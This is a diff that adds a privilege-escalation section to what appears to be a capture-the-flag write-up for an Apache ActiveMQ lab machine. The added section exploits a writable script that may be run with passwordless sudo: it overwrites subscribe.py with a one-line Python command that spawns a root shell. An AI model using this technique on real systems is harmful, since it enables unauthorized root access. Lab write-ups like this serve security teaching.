@@ -19,5 +19,16 @@ use exploit/multi/http/apache_activemq_upload_jsp
 ```
 ## Q4 - Which videogame are Paul and Max talking about?
 * once we have a terminal session on the box, open up `chat.py`
+## Privilege Escalation
+* our user has certain sudo permissions:
+```
+User activemq may run the following commands on activemq:
+    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
+```
+* it turns out that we have write permissions on this script, `subscribe.py`
+* that means we just need to overwrite the contents of that file with some shell-opening Python code:
+```
+echo 'import os;os.system("/bin/bash -i")' > subscribe.py
+```
 
 
